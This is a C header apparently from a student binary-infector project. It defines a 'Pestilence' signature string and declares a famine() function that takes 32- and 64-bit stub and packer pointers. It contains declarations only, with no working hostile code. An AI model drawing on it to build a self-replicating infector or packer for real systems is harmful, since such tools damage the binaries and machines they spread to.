#ifndef  FAMINE_H
# define FAMINE_H

// ---
// Includes
// ---



// ---
// Defines
// ---

#define FAMINE_SIGN "Pestilence version 1.0 (c)oded by ale-boud - amassias"
#define FAMINE_SIGN_LEN 54

// ---
// Typedefs
// ---



// ---
// Function declartions
// ---

void	famine(
			const char *stub32_start,
			const char *stub32_end,
			const char *stub64_start,
			const char *stub64_end,
			const char *packer32_start,
			const char *packer32_end,
			const char *packer64_start,
			const char *packer64_end);

#endif
